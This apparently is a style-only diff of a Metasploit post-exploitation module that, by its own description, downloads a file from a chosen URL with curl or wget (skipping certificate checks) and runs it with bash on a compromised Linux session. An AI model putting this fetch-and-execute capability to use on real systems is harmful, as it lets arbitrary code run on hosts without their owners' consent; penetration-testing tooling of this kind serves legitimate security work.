@@ -7,27 +7,30 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::System
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Manage Download and Execute',
-      'Description'   => %q{
-        This module downloads and runs a file with bash. It first tries to uses curl as
-        its HTTP client and then wget if it's not found. Bash found in the PATH is used
-        to execute the file.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Manage Download and Execute',
+        'Description' => %q{
+          This module downloads and runs a file with bash. It first tries to uses curl as
+          its HTTP client and then wget if it's not found. Bash found in the PATH is used
+          to execute the file.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Joshua D. Abraham <jabra[at]praetorian.com>',
         ],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter']
+      )
+    )
 
     register_options(
       [
         OptString.new('URL', [true, 'Full URL of file to download.'])
-      ])
+      ]
+    )
   end
 
   def cmd_exec_vprint(cmd)
@@ -49,7 +52,7 @@ class MetasploitModule < Msf::Post
       vprint_status "$PATH is #{path.strip!}"
     end
 
-    path.split(":").each{ |p|
+    path.split(":").each { |p|
       full_path = p + "/" + exe
       vprint_status "Searching for '#{full_path}' ..."
       return true if file_exist?(full_path)
@@ -72,7 +75,7 @@ class MetasploitModule < Msf::Post
     if exists_exe?("wget")
       print_good("wget available, using it")
       @http_client = "wget"
-      @stdout_option =  "-O-"
+      @stdout_option = "-O-"
       @ssl_option = "--no-check-certificate"
       return
     end
